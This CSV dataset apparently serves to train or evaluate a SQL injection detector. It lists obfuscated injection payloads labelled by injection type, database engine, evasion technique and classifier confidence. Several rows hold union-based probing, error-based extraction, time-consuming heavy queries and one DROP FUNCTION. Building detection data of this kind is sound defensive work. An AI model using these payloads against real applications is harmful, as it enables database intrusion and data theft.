payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0x5';whErE 0x0b0o34e9_=,(SeLEct 0B0b0x0B0b0o0B3X2b07e6O51)= + && 9x0X2142=-{( SeLECT>CoUnt ( J_\N* ) fRom!doMain.dOmAINs!as%t1,dOMAiN.ColUMnS/*fX?[wLih*/AS)t0X4,DOmaIN.TaBlES aS t4 )@/*Po3|bzsE*/ && (SELECT+0x0b4b0b0B1101111) oR falSE and TrUe && tRue aNd (sEleCT (sElECT[(seLeCt)2469))) not lIKe 0X2a0B110 AnD tRUe OR 'Fy`;' Not lIkE 'Fy`;':Or/falsE OR fAlsE or (sElect 0x1c8e)!=(SELeCt 0x1E82) oR 0B0*oR ""!;""<>""!;"" OR[FaLsE Or FAlSe --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"9B0x1' ANd _4X0b5711001000110 lIKe DBmS_UtIlItY.sqlId_tO_SqLhASh? .( ( ( CHR~ ( (SElEct 0X71) );` Or ChR ]( (Select 0O0B0b0b1010110110130081071010011110000000101111508111010711311110101110001), ) oR?CHr ( 0B8111000. )< + oR CHR~(([ (SELecT 0o0B0X0o0X3b0o0o8146322) ) or)CHR$ ({ (SeLECT 1B1110001)} ) ;or (| seLeCT _ ( caSE WHeN \ ( (SElECT}0b0x1E4c) LikE 7x3x0O1e20 <){ THeN 0x0b0o0B8O1 eLse 0X0x5O0X0o5b0 END? ) ?froM}DuaL; ) or ]chR ( (SeLEcT (sElEcT:(seleCt (SelECt (SeLEcT (SeLECt?(SElECT (sELECt (sELECt (sELeCt (SELECt>(seLEcT (seLect (sELeCt (Select (selecT (sElEcT~(SeLeCT|0x71)))))))))))))))))) ): Or chr {( 0x0B111A ) OR/chR ;(& 0x9E ) or Chr ( +0b4O0b0O0x0X7A )>, OR cHR ( (SeLeCT:0b11011115) ) ) ])<^@{and 'yvXg' *= 'YVXg",unknown,oracle,case_variation|hex_string|scientific_notation,0.11,rule,sqliv5_json,unknown
"0o1' OR _ ( SEleCt 'zbdV' wHere (SelECt (seLEcT`0X0O2152)) LIke 0x0b0b11O0B101X656 { || <-ExP ( ~ *( selEct * frOM/**/ ( sElECT~CONcAT ;( 0x0O0x45df7e4a21,% ( SeLecT ( elT ( (select (SeLECt 1X152E)) => 0x182e,(seLeCt (sELEcT (SELect (sElECt (SELECT (SELECT 1)))))) ; )[ ) "")""_,0x017A784a71,0o0X78 ) <)- x ) ? ) ) oR '",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"3' ) AS uLBr where 0X1C49 liKE (SeleCT 0X1C03) AnD (SELECT (SeLECt (SELECT 3737))) LIKE$ DBms_UTilIty.sQlID_TO_SQLhaSH @ ( +. ( *chr ( [0x330 ) Or cHR; ( (SeLECT?(SEleCT (SELECT 0x0O107))) ) ] or ChR ( (sElECt (sELEct&(SELeCt (SEleCT 0X70))))^ ) or &CHr ]( (SelECT (sElECt 196)) ) Or Chr ( (sELEct (SElEct 213)) ) OR (';seLect ( cAse WheN ! ( 0O0X0o1e0O4C liKE (SelecT (selEcT (sELEcT 0X1518))) ) THeN$(seleCt 0X1) Else 0X0=End ) FrOM dUAL* ) or cHR ( (sEleCt 0X71) )} || chr/*w[&X(IWP8ZDd V0O0-ms=Fp aND True oR falSE OR 0#/*/ ( 2B1101010} ) /||cHR^=( (seLect (sElECT 118)) ) ] oR Chr <( :0b0X0o0O0x4a ) || chr ( (SElECT\0xd8) ) ) ` ) oR FAlse or ' ' not LiKe ' ' AnD;TRUe oR FAlse And trUe And^ ""+"" Not lIkE ""+-"" or fAlse AnD(0x0 oR fALSe And TruE and truE or FalsE And TRUe Or 0X0 ANd trUE aNd (SELecT (seLeCt (SEleCT (SeLeCT 1)))) AnD (sELECT (SelEcT 0x1)),--$",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.51,rule,sqliv5_json,unknown
0o0B1' and{ ( (sELect (SelEct (SELECT 0o0xd5f))) LiKE 0x0o11e6d _) +*(SELECT 3739) AnD?'Pdia' LIkE('pdIa,unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) As ADzJ whERE 0X15C9 /*|O}tE9mrs.WhUXU;Dru$?*/= 0O0X15c7 or+0X20e4 =: ( selEcT CoUNt]^( * ) FROM GeNeratE_serIes ( 0x0x1,0x3C4b48} _) `) OR 'a' Not LIke 'A' AND (sEleCT (SeLEcT 0x1)) aNd (seLECt.0O0x1949) noT lIke!(SeleCT (SELect (SELECT (SELECT (SELECT 6473))))) or FAlse or faLSe aND ""R}""<>""R};"" or falSE OR False AND True --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
sELEcT ( cAsE whEn ( (sELECt 0o20736)} LIKe (SelECt (SeLEct (sElECt 0x1e5c))) ) >|theN 0X203E ElSE 0X0o321E* ( SeLecT (SelECT 1X209e) FROm infoRMAtIon_sChEmA.charaCteR_sets ) End'!) Or 'i9' LikE 'i8S' Or FaLSe aND/*fSBu*/(SelecT 0x1) OR fAlsE#)Vy&TYG,boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0B1' () &&)$ "", And elT (. (SeLECT 1B101111101101)? lIKE* 0x0x9e0o4,(selEcT+(sElect (SElEct>0O1X26fA))) .) aNd{ ( ( ?:'yfaa' liKe 'YFaa",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"9"" ) ] and >( *seLECt$0x7O0b10* ( If ( (<_ SElecT * frOM ( .SeLeCt COnCat (, 0X0x6d6e7aa75, ( SelECt ( +eLT ( 0XD9C/*TNGb\FO'y*/ like (selEcT (SeLecT 0b1xD9C)),(SelECt (SeLect (SElecT 0x1))) % ) ) ) ,0x0b1011001101A0B1011111111a71,0x78 /**/!) ) ` S| )}<,(2x7531Dcfb684a2aFA, 0X1418de11e93BFffA $) ) ;) ; && ( ""YPoJ"" liKE ""yPOj",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o0O0B1' aNd`TruE and ""0X0O0o0x0B0o2070"" lIKE ""0o0x8"" or Or falsE aNd<1 or FaLSe oR (SelEcT (SELECT 289))=(selEcT (seLeCt 0x122)) or ""_wp""=""_wp+"" && TRue or 'LC'!='lC' or FaLsE or FalSe anD 55 nOT LikE 56 OR False#'!' not like '!' OR 0X0 or (SELeCT (selECt (SELeCT (seLecT 7)))) OR faLse OR FalSE Or 0X0X0X26D0 != (selEct 0B10011011010010)# ) ) as jPXj~WHERe](sELecT 0X0o21A5)=(sElect (sELect\(SeleCt (SelECt$(SelECT 3O15141))))) Or (sELECt 6o0o17734)= ( SELeCT cOuNt ( */*e|+[ */.) fRoM GEneraTe_SeRIES; ( (SEleCT (SELeCT 0X1)),0X5a06E0 )| )$ ? or '0o0o4b102010110510=(seLecT (SElect 0X497))$Or;8X0 --UKbfk!a=~3",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.06,rule,sqliv5_json,string_single_quote
"0o0o3x5X8b4b1',wHerE;0B101O8b1b1111101000x0o7X0b0B0o0B10E0O9x0x0O0O11f&> LikE;;not LIke/0b0o0b10011101011100111-uNion=ALl^SeLecT}NulL,NulL,nUll,NulL,NulL,nUlL,NULl,NUll,NUll--",union_based,unknown,case_variation|scientific_notation,0.8,rule,sqliv5_json,unknown
"6X0o7' WhEre (sELECt 0x3f9) lIKe 0b10111101101 anD`0x1D84 lIKe"" dbMs_uTiliTy.sQlID_tO_sqLHASh ?( ("" Chr ( (sELect/0o0x76) ) Or chR ( 0O461 ) ""||chR (? (seleCT (SELeCt (SeLECT (sElEct 115)))) $) : or %chr *( ^(sEleCT 0x1A) ) ||CHr< ($ (SELeCT (seLEcT (SELECt (seLeCT (SELECT 111))))) ) or ( sELEct ~ ( CaSe wheN^ }( 5x1e0o56- like 0o0X0O15114 ;) theN (selECt 1) elSe (sElecT (seLeCT 0)) End ) fROm DUAl? )^ ||chR ( (SElecT (sEleCT (sEleCT (seLeCt 113)))) ) oR CHR ( (SELEct (seLect;0B0O9B1111019)) ) ||cHR> ( 0b0X2B0O0o9B1110110 ) Or cHR `( 6x0B111a *) ||cHr (&/*R]H2/!BrNuM, <O 0x16{Lz.~m(dC&czS*/(sElect (SELEct (seLeCT (sELecT 0x71)))) ;;) ` )| ) Or 0X0 oR fAlSe Or fALSe OR FaLSe OR'fALSE AnD truE;Or (seLEct 0x0X99a) nOT LIKE 0x56d OR fALSE aNd (SelecT (SELECT 1)) AND True AND 1#oR 'wk;d ' likE 'wK;D Y' anD/*)*/%'T' <> 'TA' Or ""V"" Not liKe ""V""*OR)8X5* oR (SelecT 0) anD tRuE AnD TRUE oR '0x6 O9'\NOt LIke '1 o9' Or False and (seLEct (sElEct 1)) Or fAlSe oR ""c""=""Cx"" --M_q-F]tve-",boolean_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,string_double_quote
"1 wherE 0b0o11267< LiKE (sElECt 0o81216) anD 0b0O24125464377351=dbMs_utILiTY.sqlid_TO_SQlhash ( * ( & CHR ( (SElEct (sELECt 0o267)) ) ||cHR (( (SeleCt 0x71) ) ~OR Chr >( (sElECT (SElEcT (Select (SeLECT (SeLECt (SELECT 132)))))) )^ ||cHR ($ 0X6A )?[||CHR ( (SelECt (sELeCT (sElecT 0x21))) ) or (^ sELEct ( >caSE!WHen (!!0o0b0o0B9B0X103ACD1Ec8c $= 0b0B1111001001100\ ) thEn$0O0x0O0X1/**/elSe 0O0 ENd ) fROm;DUal ) OR CHR \( (sElect (sELect 0x6F)) \) Or ChR^ ( 0b0Xa2 ) >||chR ( )(SelecT (sELECT;0X0x49)) ) Or ChR ( 0O0B1111010 _) !oR Chr ?( (sElECT (sELecT 0o0X0B1001100)) &) ) ) or^FaLse;ANd(true or((sElECt`0x6) AnD true aNd (seLECT (SelEcT 0x6E0))<>(sELecT 0b111101101) && -""gu&""!""!=""Gu&""!m"" And tRuE OR ;FaLSe<or FALSe aND (SElECt;(SELECt (seleCt (SeLeCt (sElECT 0x1))))) OR (sELecT 0x0) --",error_based,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.51,rule,sqliv5_json,unknown
"1 ) WhERE (SELECT 5196) like (SEleCt 0X13E8) and (sElECT 0x221F) liKe /*YYV*/ ( sEleCt coUNt (` * ) frOM geneRate_sERiEs ( (sELECt 0o1),(selEcT (SELect 0x4C4b40)) ) ) !--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
SElEcT_sLeeP (^/*Y?*/(seleCT 4X5) ) and ( ( <(SeLECt (select (sElect 0X21e6))) Like 8674,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o0o3B2X5"">|;) `;)? ) ANd ELt ($ 0B0B0B11045010110 like <3B0x1e0b0b11110110110101000010,(SELECt((SELECT 0X1DaC)) ) && , ( % ( :( ""Qcro"" + lIkE ""qcRO",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0 ; ) ""') aS sxhg WheRE 0x1e13=(SELECT 0X0B0b1x1E11) Or!cHar\ ( (SEleCT (SeLecT 0XD4))& )/*&nM~jgzL&*/ /**/or CHaR ( .(seLEct 0X76)) ) OR Char ( 0x59 )) Or cHaR ( (sElECT 0XBe) ) like regexp_suBSTRIng ( REpEat[ ( lefT (} crYpt_KEy /* L($%rJ93jX ]RT< r*/( ChaR ( 6B1409071 ) or ChAR ( (sELECT (SELEct]0X3c)) () . OR cHAR[ ( %1X5b11e[?) !,NulL ) ,(SelEct 0x0O7O0) ) ,0X0b10100C0x357B3 ) ,nULl ') oR ""t0X6"" NoT lIKe ""T6"" OR ""U"" nOt like ""U"" aNd TRue^ OR (SeLEct 0X0) And TRUe aNd (seLect (seleCt (sELeCT (seleCT 1)))) ;anD (SElEct (SeLECT (seleCt (SELECT 1)))) OR (sElect (SeleCt (SEleCt 0))) aNd TrUe Or faLse OR FALSE AnD trUE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1"" ) ~aNd char (. 0O0B0o4215360 ) or cHaR ( 0xDD: ) oR char{ ( ;9X0B111101 ) or CHaR (? 0x50 ){ LIKe RegeXP_SUbSTRing ( REPEAT ( lEfT? ( CRYPT_key (, cHaR ( (seLECT (SelecT 0x23)) ) Or char ( (SEleCt 2x45) ) ' or chaR, ( 0B0B11110110108101011011 ) ,NuLl )! ,0B0O10x0b111X0b0 )/*_cTOg 5m;2KLZlI?(BB}4s< 9B*/ ,0B0x0b0X9dCd0B1000110B8 ) ,nULL ) or 'x' NOt liKe`'X' OR~0x1E07 LiKE.(SElEcT 0X1e18) Or('e'='eF' And TRUe oR FAlSe And (sElEct (sELeCT (sElEcT (SELECT 0x1)))) oR](SElect (sELEcT (sELEct (SeLect (SELEcT 0x0))))) Or falSE OR FALSe Or False,Or (SElecT 0X23A5) <> (SElEcT 0x23A5)&&tRue && TRue and 'w>J;'='w>J;' oR FalSE Or (selEcT (sELECT 0)) --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
"4"" `)| wHEre (SeleCT\(seleCT (SELECT 7518))) LiKE 0X1D0b1051a and (sEleCT 1o64416)= ({ selECT CoUnt~ ( * ). $From RDB$fiELDS}As t0o1,rDb$tyPes as T0o2,Rdb$cOLLATioNS aS t3,rDB$FUNctiOns:AS t0 );,AnD 0XF9E NoT likE (SELECT 3998) (/&& (sElEct (sElect (SElEct (SELECT (SELECT 9075))))) LIkE 9X0x0XfEe ||~fALSE ANd 0B1x1E4F nOT lIKE|0x67AC and True(anD (SELECT (SELECT (SELECT 1)))`oR:(sELeCT (sELECt 0x0)) or ""p"" liKe ""pT"" and 'Kl'='Kl' oR (SELECT 0x0) or 0x0 oR FALSE oR (SELECT 0x0) aNd truE aND)truE OR False OR False --",boolean_blind,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
0x1/*oX<kWPfa*/wheRE!0X1e0b0x6fa'= 7802,unknown,unknown,comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0X0B11 WHERe (sEleCt 0x18DE) =/*M f D*{-*/ (seLeCT (SELECt 0x18E1)) prOCeduRE aNaLYse ( exTractVALuE ( (SeLecT 0x16Df),coNCat ( )0o0B100X0B101c, ( <bEncHMArk ;( (SeLect (SeleCT 0x110)),mD8; ( 9x52515A0B110010 ) ) [ ) ~) ] ) ,0O0b1 ) .or 5o0 aND TRUE aNd (sELect (selEcT (SeLeCT 1))) aNd trUe --",error_based,mysql,case_variation|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"0B0B3B7' +) {OR`(sEleCt (SeLECt (sELEcT (SelECT 0X1e2E)))) LiKe ^( SELeCt COuNT'}( * ) ' FROM+sySibM.SysTabLES as T0o0X1,SySIBM.SYStABlEs(As?T2,SYSIBM.SyStAbLEs^as t1X4/`) }&& '5' liKe '5' or ""W""<>""W"" and tRUe OR 0x505<>(sELECt""(seLEct (SelEcT (SeLeCT 0X405)))) AnD ""e9g0B0B11000011101011011""!=""e0B1g37h"" && (SELect (seLECt (select (SelEct (selEct (SELECT 1)))))) oR fALsE or "":L""n""<>"":l""N"" anD TRUE and truE OR FaLse --",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
IF ( /**/0B0Xa5B0X1e848b: =$ 0o5x5AA5 )})>sELect 0X0B0o2XA0d)ELSe~drop fUnCTiON qMNo--,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"4 )/* AND (SelEcT (sElecT 0x815)) NoT lIKe 0B0X0O7Da or+0b1101111680001<>0X0b1bE1 oR 0X0||faLsE and true oR FALsE oR fAlsE ANd tRUe AND 3869!=3870#e7Da}/C tK<Y*(SELect (sELeCT (sElEct 0x5)))6ejb*/ oR ChAR ( (SElEcT 0B11x1O0o16)` ) ^ ! Or ChAr ( 0b0B0b101000100101110110101 ) ) Or cHar; ( 0X61 ) or char/**/ ( 0x55 ) =, rEGEXP_suBStRing\:(/**/ repEAT. ( RIGHt -(\(ChAR_ ( }(SelECT 0o5X150d) ) ,0x0; )( ,2X0O14D50E0O1414 ) "",NuLL ]) anD ( (SELeCt 0x15F0o0) lIkE (SeLEcT (selecT 0b0b0b1101000011001001011011000111101011011110000100010110101100001110111000011110100010001101010011110101001000000111010000111101111100));^=QSH&Xl~(",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"sELEcT cOUNT ( *} )""_[FRoM geNERatE_seRIES ( 8X3b2b0X8o3E9B9b0b1001b1801111O11,0B400X0o4c7b0o107%?)./*\ P!O(SkKf(S aEc0B100OEVTJ*/ anD& ($* <(?[ ( <'%' }[[liKE` > '<cT",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"1"" /**/ )< )} or ( ;SElEcT (seLeCt 0b0b10014001100010112010011491000011001005110601) FroM ( selEcT couNT \( * ) ,cOncat ( 0X0x0O6D6E0O5aA0B1001101, ( SelecT ($/*(seLECT (seLecT (seLect (SeLEcT (sElEcT (Select (SELeCT (seLECT (SelecT (sELecT (SELECT (SELECT 9))))))))))))@0x4 <\ 0X53*/ELT :( ""H""=""H"",0X1. ) )! ) ,1X747a0B0b11110100001001001011A21,FlOoR! (_ ranD \( 2X0 ) *(SelECT (SELect<(sELEcT>(SeLect (sEleCT (sELEct 0X2)))))) \ )' ) X From iNfoRmatIOn_SCheMA.chARacteR_sets GROUP BY X ) A ) ANd ( ( ""vleV"" Like ""vLev",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b0B0o0O2'`{) : WheRE 0X0o0b0x1ecf LikE` 0o5x1E93 ANd:UpDatEXmL ;(; 0b110100116501,CoNCaT ( 0x0o0x4o2e,0X0b4X0b11011610000710111103111a11, ( ,SELECt( ( +Elt (&<2X0b0XD0b0X18A89 + NOT}LiKe + 0xd41,0x0B0B1 <) $ ) + [)/*I|W0o22 WI;t(V */~,0X913a767A70 ) ,0X409 ,) anD (sELecT 0X0O1) && $(sELECT 0b10001010140040) nOt lIKE/*r*/ (SELEcT (sElECT 2X22BF)) or fALSe or (seLeCt (SElect (seleCt 0x0))) ANd :True aND\TRUe OR 0O0AnD""J""=""J""AnDTrUe AnD TrUe AnD 0o0x5b4<>(selECT 0X5B5) AnD (seleCt (sELeCt 0XB2C)) nOt LiKE 0xB2D ANd;(sELEct AND tRue Or FalsE oR FalSe ANd ""d""=""d"" OR False#(SELECT 0x1)) OR 0X18FA like (selECt (SELECT 0x18fb)) and (SelecT (SeLEct (SELECT 1012)))<>(selecT (sElect (SELECT 2x3ff)))!AND>(selEcT (sELeCT 0x1)) --y5v!j)O_( i",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"0B8o0X1 ) /**/ ) ) || CHaR ( 0x0O3b ) OR Char ( (selECT (SELECt (sElEcT (SELECT 50)))) ) || CHaR ( (sEleCt (seleCT (selEcT (SeLEcT 99)))) ) Or CHAR oR (sElecT 0o0X1398)<>0x1385 And tRue or falsE Or falsE aNd (SELECT 1) or 0#( (sELeCt!(SELeCT 0o520)) ) ?liKE ReGexP_SUbstrIng ( REpEat ( LeFt ( CRYPT_key ( chAR ( (SELEcT (SElECt (SElect (selEcT (sElEcT (selEct 65)))))) ;) ||cHar ( 0x45 ) || char ( (0X73 ) ,NUll )[ ,0x0b0b0O0 )< ,(seLect 2X1dCD0x12E6) ) [,nULl ) --t%Txw",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 aNd "" ( sELect (sELeCt (SELECT 9067)) FROM ( SELEcT cOUNT ( * ) +,ConCaT ( 0x0x6d5E7aA0o0b1101011, ( sElECT :;( Elt* ( 0o0o21503 ]like? (SELeCT*(SeLEct%9xfe0b11)),(SeleCt (SELECT 1)) < ) ); ) ,0x1b1041601101A0x2ffA71,Flo oR ( RaND ( 0x0o0 ) *(SeLECT 0x2) ) ) X frOm inf Or matioN_SChEMa.cHaRacter_SeTs GrOUP By X ]) A )",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"5 )] AS xUvZ;wHErE (seLEcT 0X1FE0B0X3E9) LiKe 2B3xBF9B0O255 Or&(selEct.(seLEct 0x93F)) Like+ (. SelEcT COUNT ( *~ )/**/ fROm RDb$fIelDS~as/*IY\wbp8""*XbtaSWsm2Gkxjh RZ */t0b1,rDB$TyPES AS t6,RDb$colLatIons,as T3,rdB$fUnCTIOns As T7o4 )` AnD ?(SeLECt]2x8cd)=(SELEcT (selECT 0X0O10cd))+ oR\''(Ii3O6''nOT LiKe '(II6'{ OR (SeLecT]8x0):or;""tN"" NoT LIKe ""TN""=or[FAlSE`oR)faLSe Or falSE AnD tRUE%aND%TRUe Or (select (SELECT 0)) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
1'+ ( selECT zMbu~WHerE 0O7b201003100100001 = (Select (seLECT (sElECT (SELECT 4585)))) rlIKE / ( SElect/**(SelEcT (selEcT 6))w 2YFq*/ ( cAsE{WHen ( &7x0o7E0x1D LIkE/*(SeleCt (SeLect 0X29))= N^rPjK*/ 0x0e09; )` tHen (SELECT?(SELeCT (SeLeCt (sElect (SELeCT 0o0X2))))) ELSE 0o0X0x0x0X0b11100 enD % ) ^ ) \ ) +',unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"3"" ) () as^Dcrk wheRE (SElEct-0X0b1071015c)> likE 0X0X102c and (SelECt (sELECT 0o0x1e42))/*@x*_W{?+gGqO""f?v NlgAJX*/ lIKe ( {sElECT{coUnT ( * ,) /* c_qJ*/frOm SYsuSERs`& && &"">EL"" Not="">ELI""*or '^' <> '^'@And.TRUe*oR ""H(f;C"">not LIkE :""H(F;c"" or ""K"" Not LIKe ""k"" And (SEleCt (selEct (sElECT (select (sElEct (seLeCt (SELECT (selECt 1)))))))) OR FALSE or\(SElECt (SeLEct (sELECT (sELeCt (SelECt 0)))))#AS,SYs0o4,SYsUsErS~aS#Sys0,sysuSERs As>sYS3,sysUsErS aS SYs0o4,SYsuseRs As}sYs0X5,sYsUsERs aS sys0o0O0B110,SySuSERs/*<&W+G]`Wd|QT*/aS SYS0 ) --38yo:tqBS0o4O0o0O13DP]IF [K&~W c",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 )] ) < ) /*0X0o1B*c^K.lKi* HAEfYD V*/ = or ]0b101B4XEcCfE26E0B1017000==_ ((]'AbCDefG',upPER+&( (hEX\ ( RaNDOMblOb*%(^ 0o0X0x8dCD6O17950/(SeLect (seLect 0x6X0b0b1100100))O4E _*/*/MxaA@0O0q;NLCk*//**/) /*{P{w?"")<il B!WG*/ ) /**/! )< :)~; and/ (:? ( + ( +1X0B0b1001141101100Fa=7B0b1001000110001101000110101111101111000011110",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1' .]) ) or UPdAtExMl ( 0X0o0b10100511010,ConcAt (< 0x0B0B1111E,0O4x3B0B1100000010001110010121180101111011110011111100011101011100101000010a1, (\ sEleCt <(/*}(sElecT (SeleCT 9))*/]ELT/ ( 2X0b1000X2cA = 9B11100010703,(seLECt 0X1) ( ) )) &)~ ,6X4B0B111100010000101010011100091101a783A0B0b11110100001010102111 /) ,(seLEct 0X0O35d6) ) ! /**/AnD (sELecT (SElECt (SELEcT 6X8e7)))=(sELEcT?0X0x8E7)<Or`' 4'=' 4e' and 2x0B0X8a4\NoT LiKE (seLECT'0x0O4249){ aNd [ (seLeCT (SELEct 0b0x1))+Or FaLsE or ""l"" not LIkE ""L"" or (seleCt (seLeCt (sEleCT_(sElecT (SELECT (SeLEcT (seLECt 0x0)))))))\or FAlsE oR 0x0 AnD ""huS""=""hus"" aND TRue oR faLsE;AND True#and ( (+ 'GyDH' ;lIKe, 'gYDH;_ AP>G~l2",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
6 R= ( SEleCT ( CAsE WHeN% ( (SelEcT (SElEcT 0X7X9E01))=(SeLEct (SeLECT (SELECT (SELECT (SELECT 9689))))) ) { tHen 1 elSe}8x22 ENd ) ) ? OR FALsE OR?0 And tRUe -- JdUwg,unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
0o0B1x7%' - )\ ) < aNd (sELecT (sElECt 0b0x1d1o2e)); LiKe 3X5o0b0x0O0B4d0b109d AnD ( LiKE /*/yH0x1gPZ*/([ '%' /*r:CfNj{+Mio%0o0X5c Or (sElEct~0B0X15c)~NoT lIKE/0x15C/**/ anD 5X1e0X0o5F nOt Like (SeleCt 1X1E96) oR fALse Or FalsE or fALSEANd(sElecT (SELEcT (SELECT (seLeCt (SELECT (SELECT 9814)))))) Not LIKE 0x2657#:v*/=<}'3=jK}BP 0fdDI[qcXa,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B7' ~) /*p !DT)*/ ) ) oR cHaR (< 0b0X0b6o0o7O226 /*XcArvvH|X*/) Or cHar ( (seLECt (SEleCt 0x0O0X0B00d)) ;) /*W:/(0b5090VI%@(sElect (SelEct (SELect]5X3)))]0b108nU*/ Or cHar (/*D)s+b*/ (sELect (SelecT 0x61))/xH5*/ 03a*/ ) ? OR CHar ([ (seLECT (SElEct (seLECt (sElecT (sElect (SEleCT (SELECT 85))))))) ) LIKE REGEXp_sUbsTRInG% ( %REPeaT ( RIgHT (^ cHar (~ 3O12411 ) ,(sELect 0o0b0b0) ) ,(sEleCT (SeLecT)0X1E0X6C7Bb9)) ) ,NuLl ) AnD ( ( ( ( 'CyLU'~ like 'CylU",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1 ^) aS tJwa WheRe (sELEcT 0x668) liKE (sElect (SeLECt (SelecT 0O2525))) or _EXtrActValuE ( (seleCT (selEct (SelecT (seLEcT 1276)))),CoNcAT ( 0X5c,2O7X5x6d6E0B111aA76, ( sElect ( eLt ( (SElect (SeLeCT 0X511)) >LIkE (SElECt/*ol(:*/(SeLECt (sELeCt 0X521))),0x0X1 )! ) ) ,0X0o1318A667a0x47 ) ( )[ oR ""Z8/"" nOT LiKE ""Z3/"" aND 1 OR FalSE anD (Select 1) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,numeric
